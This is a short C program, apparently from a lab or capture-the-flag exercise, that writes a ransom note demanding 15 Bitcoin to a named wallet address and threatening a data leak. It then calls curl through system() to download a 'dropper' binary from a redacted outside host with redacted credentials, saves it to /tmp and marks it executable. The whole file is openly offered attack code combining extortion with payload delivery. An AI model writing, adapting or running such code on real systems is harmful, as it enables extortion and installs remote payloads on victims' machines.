#include <stdio.h>
#include <stdlib.h>

int main() {

    FILE *file = fopen("/home/codesus/RANSOM_NOTE.txt", "r");
    
    if (file == NULL) {

        file = fopen("/home/codesus/RANSOM_NOTE.txt", "w");
        if (file != NULL) {
            fprintf(file, "!!! This is a ransom note !!!\n");
            fprintf(file, "\n");
            fprintf(file, "ShadowWizardMoneyGang haz y0ur dat4 and n0w wantz m0000000neyyyyyyyy!!\n");
            fprintf(file, "Submit 15 Bitcoin to the following address or we will leak your data! \n");
            fprintf(file, "\n");
            fprintf(file, "Bitcoin Address: 1JwSSubhmg6iPtRjtyqhUYYH7bZg3Lfy1T\n");
            fprintf(file, "\n");
            fprintf(file, "- WE LOVE DROPIN' SHELLS -\n");
            fclose(file);
            printf("Created RANSOMNOTE.txt with 'lorem ipsum' content.\n");
        } else {
            printf("Failed to create RANSOM_NOTE.txt.\n");
            return 1;
        }
    } else {
        fclose(file);
        printf("RANSOM_NOTE.txt already exists.\n");
    }

    system("curl -u gangoperator:K<--- SNIP --->] -o /tmp/dropper http://<--- SNIP --->/files/dropper");
    system("chmod +x /tmp/dropper");

    printf("Finished downloading dropper binary.\n");

    return 0;
}

